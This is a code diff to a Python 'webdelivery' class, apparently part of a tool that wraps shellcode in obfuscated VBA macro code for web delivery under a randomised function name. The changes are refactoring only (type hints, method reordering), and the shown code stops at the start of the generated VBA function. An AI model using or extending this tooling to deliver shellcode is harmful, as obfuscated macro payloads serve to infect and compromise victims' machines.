@@ -4,7 +4,7 @@ from vba.utils.formatters import *
 
 class webdelivery:
 
-    def __init__(self, shellcode, arguments):
+    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
         if 'outfile' in arguments:
             outfile = arguments['outfile']
@@ -12,13 +12,10 @@ class webdelivery:
             outfile = 'output.txt'
         self.shellcodeType = type(shellcode).__name__
         if self.shellcodeType == "str":
-            self.type = 'String'
             open(outfile, 'w').write(shellcode)
         elif self.shellcodeType == "bytes":
-            self.type = f"[u8; {len(shellcode)}]"
             open(outfile, 'wb').write(shellcode)
         elif self.shellcodeType == "list":
-            self.type = f"[&'static str; {len(shellcode)}]"
             open(outfile, 'w').write('\n'.join(shellcode))
         print(f'Output saved to {outfile}')
         self.shellcode = globals()[f'{type(shellcode).__name__}_to_vba'](shellcode, 'obfuscated')
@@ -28,16 +25,16 @@ class webdelivery:
             print('No url specified')
             exit(0)
 
-    def compilerOptions(self):
+    def imports(self) -> list[str]:
         return []
 
-    def transformer(self, shellcodestring):
+    def compilerOptions(self) -> list[str]:
+        return []
+
+    def transformer(self, shellcodestring: str) -> str:
         return shellcodestring.format(shellcode=f'{self.name}()')
 
-    def imports(self):
-        return []
-
-    def codeblock(self):
+    def codeblock(self) -> str:
 
         codeblock = f"""
 Private Function {self.name}()
